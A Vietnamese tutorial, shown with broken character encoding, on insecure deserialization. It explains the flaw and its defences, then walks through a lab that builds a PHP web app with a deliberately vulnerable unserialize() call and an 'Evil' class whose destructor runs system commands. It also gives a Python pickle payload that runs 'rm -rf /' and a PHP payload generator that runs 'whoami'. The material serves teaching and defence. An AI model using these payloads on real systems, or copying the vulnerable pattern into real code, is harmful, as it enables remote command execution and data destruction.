# üîê Insecure Deserialization - L√Ω thuy·∫øt & Th·ª±c h√†nh v·ªõi PHP

# üìë M·ª•c l·ª•c

### [**L√Ω thuy·∫øt**](#l√Ω-thuy·∫øt)

- [**1. ƒê·ªãnh nghƒ©a**](#1-ƒë·ªãnh-nghƒ©a)

- [**2. C√°ch khai th√°c**](#2-c√°ch-khai-th√°c)

- [**3. C√°ch ph√≤ng ch·ªëng**](#3-c√°ch-ph√≤ng-ch·ªëng)

### [**Th·ª±c h√†nh**](#th·ª±c-h√†nh)

- [**1. X√¢y d·ª±ng trang web b·∫±ng code PHP**](#1-x√¢y-d·ª±ng-trang-web-b·∫±ng-code-php)

- [**2. Th·ª±c hi·ªán khai th√°c l·ªó h·ªïng Unsafe deserialization**](#2-th·ª±c-hi·ªán-khai-th√°c-l·ªó-h·ªïng-unsafe-deserialization)



# **L√Ω thuy·∫øt**

## **1. ƒê·ªãnh nghƒ©a**

**Insecure Deserialization** l√† m·ªôt l·ªó h·ªïng b·∫£o m·∫≠t x·∫£y ra khi m·ªôt ·ª©ng d·ª•ng th·ª±c hi·ªán **gi·∫£i tu·∫ßn t·ª± h√≥a (deserialization) d·ªØ li·ªáu kh√¥ng ƒë√°ng tin c·∫≠y**, d·∫´n ƒë·∫øn vi·ªác k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ th·ª±c thi m√£ ƒë·ªôc, n√¢ng cao ƒë·∫∑c quy·ªÅn ho·∫∑c thay ƒë·ªïi d·ªØ li·ªáu quan tr·ªçng.

- **Serialization (Tu·∫ßn t·ª± h√≥a)**: L√† qu√° tr√¨nh chuy·ªÉn ƒë·ªïi m·ªôt ƒë·ªëi t∆∞·ª£ng (object) th√†nh m·ªôt ƒë·ªãnh d·∫°ng c√≥ th·ªÉ l∆∞u tr·ªØ ho·∫∑c truy·ªÅn t·∫£i, nh∆∞ JSON, XML, ho·∫∑c c√°c ƒë·ªãnh d·∫°ng nh·ªã ph√¢n kh√°c.
    
- **Deserialization (Gi·∫£i tu·∫ßn t·ª± h√≥a)**: L√† qu√° tr√¨nh chuy·ªÉn ƒë·ªïi d·ªØ li·ªáu ƒë√£ ƒë∆∞·ª£c tu·∫ßn t·ª± h√≥a tr·ªü l·∫°i th√†nh m·ªôt ƒë·ªëi t∆∞·ª£ng trong b·ªô nh·ªõ.
    

L·ªó h·ªïng **Insecure Deserialization** x·∫£y ra khi d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë∆∞·ª£c gi·∫£i tu·∫ßn t·ª± h√≥a m√† kh√¥ng c√≥ ki·ªÉm tra an to√†n, cho ph√©p k·∫ª t·∫•n c√¥ng ch√®n payload ƒë·ªôc h·∫°i ƒë·ªÉ th·ª±c thi l·ªánh tr√™n h·ªá th·ªëng.

## **2. C√°ch khai th√°c**

### **2.1. K·ªãch b·∫£n t·∫•n c√¥ng**

Gi·∫£ s·ª≠ m·ªôt ·ª©ng d·ª•ng web s·ª≠ d·ª•ng c∆° ch·∫ø l∆∞u tr·ªØ phi√™n (session) b·∫±ng c√°ch tu·∫ßn t·ª± h√≥a c√°c ƒë·ªëi t∆∞·ª£ng v√† l∆∞u v√†o cookie d∆∞·ªõi d·∫°ng JSON. N·∫øu kh√¥ng c√≥ ki·ªÉm tra b·∫£o m·∫≠t, k·∫ª t·∫•n c√¥ng c√≥ th·ªÉ:

1. Ch·ªânh s·ª≠a gi√° tr·ªã c·ªßa cookie ƒë·ªÉ n√¢ng quy·ªÅn (v√≠ d·ª•: thay ƒë·ªïi role t·ª´ ‚Äúuser‚Äù th√†nh ‚Äúadmin‚Äù).
    
2. ƒê∆∞a m√£ ƒë·ªôc v√†o payload tu·∫ßn t·ª± h√≥a ƒë·ªÉ th·ª±c thi m√£ l·ªánh tr√™n server khi ·ª©ng d·ª•ng th·ª±c hi·ªán deserialization.
    

### **2.2. Minh h·ªça khai th√°c**

Gi·∫£ s·ª≠ ·ª©ng d·ª•ng s·ª≠ d·ª•ng **Python pickle** ƒë·ªÉ tu·∫ßn t·ª± h√≥a d·ªØ li·ªáu v√† l∆∞u tr·ªØ th√¥ng tin ng∆∞·ªùi d√πng:

```js
import pickle

class User:
    def __init__(self, username, role):
        self.username = username
        self.role = role

data = User("guest", "user")

# Tu·∫ßn t·ª± h√≥a ƒë·ªëi t∆∞·ª£ng
serialized_data = pickle.dumps(data)

# Gi·∫£i tu·∫ßn t·ª± h√≥a ƒë·ªëi t∆∞·ª£ng
deserialized_data = pickle.loads(serialized_data)
print(deserialized_data.username, deserialized_data.role)
```

L·ªó h·ªïng x·∫£y ra n·∫øu k·∫ª t·∫•n c√¥ng g·ª≠i m·ªôt payload ƒë·ªôc h·∫°i thay v√¨ d·ªØ li·ªáu h·ª£p l·ªá:

```js
import pickle
import os

class Exploit:
    def __reduce__(self):
        return (os.system, ("rm -rf /",))  # Payload x√≥a to√†n b·ªô d·ªØ li·ªáu h·ªá th·ªëng

payload = pickle.dumps(Exploit())
```

Khi ·ª©ng d·ª•ng th·ª±c hi·ªán `pickle.loads(payload)`, m√£ ƒë·ªôc s·∫Ω ƒë∆∞·ª£c th·ª±c thi ngay l·∫≠p t·ª©c.

## **3. C√°ch ph√≤ng ch·ªëng**

### **3.1. Kh√¥ng s·ª≠ d·ª•ng deserialization kh√¥ng an to√†n**

- Tr√°nh s·ª≠ d·ª•ng **pickle** (Python), **Java Serialization**, ho·∫∑c **PHP unserialize()** v·ªõi d·ªØ li·ªáu kh√¥ng ƒë√°ng tin c·∫≠y.
    
- N·∫øu b·∫Øt bu·ªôc ph·∫£i s·ª≠ d·ª•ng, h√£y tri·ªÉn khai c√°c bi·ªán ph√°p b·∫£o m·∫≠t nh∆∞ **whitelist classes** ho·∫∑c s·ª≠ d·ª•ng th∆∞ vi·ªán an to√†n h∆°n nh∆∞ `json` thay v√¨ `pickle`.
    

### **3.2. X√°c th·ª±c v√† ki·ªÉm tra d·ªØ li·ªáu tr∆∞·ªõc khi gi·∫£i tu·∫ßn t·ª± h√≥a**

- Ki·ªÉm tra ch·ªØ k√Ω s·ªë (digital signature) tr√™n d·ªØ li·ªáu tu·∫ßn t·ª± h√≥a ƒë·ªÉ ƒë·∫£m b·∫£o d·ªØ li·ªáu kh√¥ng b·ªã thay ƒë·ªïi.
    
- S·ª≠ d·ª•ng c√°c gi·∫£i ph√°p nh∆∞ **HMAC (Hash-based Message Authentication Code)** ƒë·ªÉ x√°c minh t√≠nh to√†n v·∫πn c·ªßa d·ªØ li·ªáu.
    

### **3.3. Ch·∫°y deserialization trong sandbox**

- Gi·ªõi h·∫°n quy·ªÅn th·ª±c thi khi gi·∫£i tu·∫ßn t·ª± h√≥a d·ªØ li·ªáu b·∫±ng c√°ch s·ª≠ d·ª•ng c√°c sandbox ho·∫∑c container ƒë·ªÉ gi·∫£m thi·ªÉu t√°c ƒë·ªông n·∫øu b·ªã khai th√°c.
    

### **3.4. S·ª≠ d·ª•ng c√°c c∆° ch·∫ø thay th·∫ø an to√†n h∆°n**

- S·ª≠ d·ª•ng **JSON ho·∫∑c XML** thay v√¨ c√°c ƒë·ªãnh d·∫°ng tu·∫ßn t·ª± h√≥a nh·ªã ph√¢n nh∆∞ `pickle` ho·∫∑c `Java Serialization`.
    
- N·∫øu s·ª≠ d·ª•ng JSON, h√£y s·ª≠ d·ª•ng **json.loads()** thay v√¨ `eval()` trong Python ƒë·ªÉ tr√°nh th·ª±c thi m√£ ƒë·ªôc.

# **Th·ª±c h√†nh**

## **1. X√¢y d·ª±ng trang web b·∫±ng code PHP**

### 1.1 **Form 1 ‚Äì Serialize object:**

- Nh·∫≠p th√¥ng tin:
    
    - `Username`
        
    - `Email`
        
    - `NƒÉm sinh`
        
    - `Gi·ªõi t√≠nh`

```js
<?php  
class User {  
    public $username;  
    public $email;  
    public $birth_year;  
    public $gender;  
  
    public function __construct($username, $email, $birth_year, $gender) {  
        $this->username = $username;  
        $this->email = $email;  
        $this->birth_year = $birth_year;  
        $this->gender = $gender;  
    }  
}  
  
$base64 = '';  
  
if ($_SERVER['REQUEST_METHOD'] === 'POST') {  
    $username = $_POST['username'];  
    $email = $_POST['email'];  
    $birth_year = $_POST['birth_year'];  
    $gender = $_POST['gender'];  
  
    $user = new User($username, $email, $birth_year, $gender);  
    $serialized = serialize($user);  
    $base64 = base64_encode($serialized);  
}  
?>  
  
<!DOCTYPE html>  
<html>  
<head>  
    <meta charset="UTF-8">  
    <title>Form 1 - Serialize User</title>  
</head>  
<body>  
<h2>Form 1: Nh·∫≠p th√¥ng tin ng∆∞·ªùi d√πng</h2>  
<form method="POST">  
    Username: <input type="text" name="username" required><br>  
    Email: <input type="email" name="email" required><br>  
    NƒÉm sinh: <input type="number" name="birth_year" required><br>  
    Gi·ªõi t√≠nh:  
    <select name="gender">  
        <option value="Nam">Nam</option>  
        <option value="N·ªØ">N·ªØ</option>  
    </select><br>    <input type="submit" value="G·ª≠i">  
</form>  
  
<?php if ($base64) { ?>  
    <h3>Chu·ªói base64:</h3>  
    <textarea rows="5" cols="80"><?= htmlspecialchars($base64) ?></textarea>  
<?php } ?>  
</body>  
</html>
```


        
- Sau khi nh·∫•n **Submit**:
    
    - Th√¥ng tin ng∆∞·ªùi d√πng ƒë∆∞·ª£c ƒë√≥ng g√≥i v√†o 1 **Object**
        
    - **Object ƒë√≥ ƒë∆∞·ª£c serialize r·ªìi encode sang Base64**
        
    - Base64 ƒë∆∞·ª£c hi·ªÉn th·ªã ra trang

Sau khi submit form 2 th√¨ **deserialize** ra **object**. Hi·ªÉn th·ªã th√¥ng tin ƒë√£ deserialize ra trang web (Username, Email, NƒÉm sinh, Gi·ªõi t√≠nh).

**Trang web s·ª≠ dung class Evil**
`class Evil` kh√¥ng ph·∫£i ƒë·ªÉ s·ª≠ d·ª•ng trong web b√¨nh th∆∞·ªùng, m√† l√† ƒë·ªÉ:

- **Minh h·ªça cho l·ªó h·ªïng** PHP Object Injection.
    
- **T·∫°o payload gi·∫£ l·∫≠p** trong c√°c b√†i t·∫≠p b·∫£o m·∫≠t ho·∫∑c CTF.
    
- **Cho attacker ki·ªÉm tra khai th√°c** khi bi·∫øt c√≥ `unserialize()` t·ªìn t·∫°i.

```js
<?php  
// Class g·ªëc User  
class User {  
    public $username;  
    public $email;  
    public $birth_year;  
    public $gender;  
}  
  
// Class "Evil" th·ª±c thi l·ªánh khi b·ªã hu·ª∑  
class Evil {  
    public $cmd;  
  
    public function __destruct() {  
        system($this->cmd);  // üí• th·ª±c thi khi b·ªã unserialize r·ªìi b·ªã hu·ª∑    }  
}  
  
$output = '';  
  
if ($_SERVER['REQUEST_METHOD'] === 'POST') {  
    $base64_input = $_POST['base64_input'];  
  
    try {  
        $decoded = base64_decode($base64_input);  
        $obj = unserialize($decoded);  
  
        if ($obj instanceof User) {  
            $output .= "<strong>Th√¥ng tin ƒë√£ gi·∫£i m√£:</strong><br>";  
            $output .= "Username: " . htmlspecialchars($obj->username) . "<br>";  
            $output .= "Email: " . htmlspecialchars($obj->email) . "<br>";  
            $output .= "NƒÉm sinh: " . htmlspecialchars($obj->birth_year) . "<br>";  
            $output .= "Gi·ªõi t√≠nh: " . htmlspecialchars($obj->gender) . "<br>";  
        } else {  
            $output = "ƒê·ªëi t∆∞·ª£ng kh√¥ng h·ª£p l·ªá ho·∫∑c b·ªã gi·∫£ m·∫°o.";  
        }  
    } catch (Exception $e) {  
        $output = "L·ªói: " . $e->getMessage();  
    }  
}  
?>  
  
<!DOCTYPE html>  
<html>  
<head>  
    <meta charset="UTF-8">  
    <title>Form 2 - Deserialize</title>  
</head>  
<body>  
<h2>Form 2: Gi·∫£i m√£ ƒë·ªëi t∆∞·ª£ng t·ª´ base64</h2>  
<form method="POST">  
    Base64:<br>  
    <textarea name="base64_input" rows="6" cols="80" required></textarea><br>  
    <input type="submit" value="Gi·∫£i m√£">  
</form>  
  
<?php if ($output) { ?>  
    <h3>K·∫øt qu·∫£:</h3>  
    <div><?= $output ?></div>  
<?php } ?>  
</body>  
</html>
```

**K·∫øt qu·∫£**

![1](image/1.png)

### ‚ö†Ô∏è **Y√™u c·∫ßu ƒë·∫∑c bi·ªát:**

- Vi·∫øt code sao cho xu·∫•t hi·ªán l·ªó h·ªïng **Deserialization**
    
    - T·ª©c l√† c√≥ th·ªÉ deserialize c√°c object **kh√¥ng an to√†n** (c√≥ th·ªÉ inject code ƒë·ªôc h·∫°i).

```js
$user_info = unserialize($decoded);
```

`unserialize()` **tr·ª±c ti·∫øp d·ªØ li·ªáu t·ª´ ng∆∞·ªùi d√πng g·ª≠i l√™n** m√† **kh√¥ng ki·ªÉm tra l·ªõp ho·∫∑c lo·∫°i ƒë·ªëi t∆∞·ª£ng**, kh√¥ng h·∫°n ch·∫ø class n√†o ƒë∆∞·ª£c ph√©p load.

- Vi·∫øt th√™m 1 phi√™n b·∫£n ƒë√£ **fix l·ªói** n√†y:
‚úÖ Gi·∫£i ph√°p an to√†n: S·ª≠ d·ª•ng `json_decode()` thay v√¨ `unserialize()`

```js
<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_POST['submit_form2'])) {
    $base64_input = $_POST['base64_input'];
    try {
        // Gi·∫£i m√£ Base64
        $decoded = base64_decode($base64_input, true);

        if ($decoded === false) {
            throw new Exception("L·ªói: Chu·ªói Base64 kh√¥ng h·ª£p l·ªá.");
        }

        // Gi·∫£i m√£ JSON thay v√¨ unserialize
        $user_info = json_decode($decoded, false); // Tr·∫£ v·ªÅ object stdClass

        if ($user_info === null) {
            throw new Exception("L·ªói: Kh√¥ng th·ªÉ gi·∫£i m√£ JSON t·ª´ d·ªØ li·ªáu.");
        }

        // X√°c minh c√°c thu·ªôc t√≠nh c·∫ßn thi·∫øt c√≥ t·ªìn t·∫°i
        $required_fields = ['username', 'email', 'birth_year', 'gender'];
        foreach ($required_fields as $field) {
            if (!property_exists($user_info, $field)) {
                throw new Exception("Thi·∫øu tr∆∞·ªùng d·ªØ li·ªáu: $field");
            }
        }
    } catch (Exception $e) {
        $error_message = $e->getMessage();
    }
}
?>
```

### 2. **Form 2 ‚Äì Deserialize object:**

- Nh·∫≠p chu·ªói **Base64**
    
- Sau khi **Submit**:
    
    - H·ªá th·ªëng **decode base64** ‚Üí **deserialize object**
        
    - **Hi·ªÉn th·ªã l·∫°i th√¥ng tin ng∆∞·ªùi d√πng** t·ª´ object v·ª´a deserialize

![2](image/2.png)

## **2. Th·ª±c hi·ªán khai th√°c l·ªó h·ªïng Unsafe deserialization**

### ‚öôÔ∏è 1. T·∫°o class gi·∫£ l·∫≠p tr√™n m√°y attacker:

```js
<?php  
class Evil {  
    public $cmd;  
  
    function __construct($cmd) {  
        $this->cmd = $cmd;  
    }  
}  
$payload = new Evil("whoami");  
echo base64_encode(serialize($payload));  
?>
```

### üß™ K·∫øt qu·∫£ b·∫°n s·∫Ω nh·∫≠n ƒë∆∞·ª£c m·ªôt chu·ªói base64, v√≠ d·ª•:

```js
Tzo0OiJFdmlsIjoxOntzOjM6ImNtZCI7czo2OiJ3aG9hbWkiO30=
```

### üöÄ 2. G·ª≠i chu·ªói ƒë√≥ v√†o `Form 2` tr√™n trang web c·ªßa b·∫°n

- N·∫øu server kh√¥ng ch·∫∑n, PHP s·∫Ω deserialize object ƒë√≥
    
- V√† n·∫øu c√≥ `__destruct()` nh∆∞ tr√™n ‚Üí n√≥ **ch·∫°y l·ªánh `whoami`**, v√† b·∫°n th·∫•y output tr·∫£ v·ªÅ.

![3](image/3.png)
